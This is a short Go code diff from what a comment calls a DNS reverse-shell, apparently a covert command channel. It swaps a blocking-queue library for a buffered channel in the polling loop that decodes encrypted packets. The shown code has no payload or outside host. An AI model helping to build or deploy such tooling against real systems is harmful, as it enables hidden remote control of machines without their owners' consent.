@@ -2,17 +2,19 @@ package transport
 
 import (
 	"chacomm/protocol"
-	"github.com/theodesp/blockingQueues"
 	"log"
 	"strings"
 	"time"
 )
 
-var packetQueue, _ = blockingQueues.NewArrayBlockingQueue(1024)
+// Create a queue were polling data will be sent.
+var packetQueue = make(chan []byte, 100)
 
 func pollRead(stream dnsStream) {
 	for {
+		// Sleep, this is a reverse-shell, not a DNS Stress testing tool.
 		time.Sleep(200 * time.Millisecond)
+		// Check for data !
 		poll(stream)
 	}
 }
@@ -46,7 +48,7 @@ func poll(stream dnsStream) {
 		output, complete := Decode(packetData, stream.encryptionKey)
 		if complete {
 			log.Printf("Final data: %s\n", output)
-			packetQueue.Put(output)
+			packetQueue <- output
 		} else {
 			/* More data available. Get it !*/
 			poll(stream)
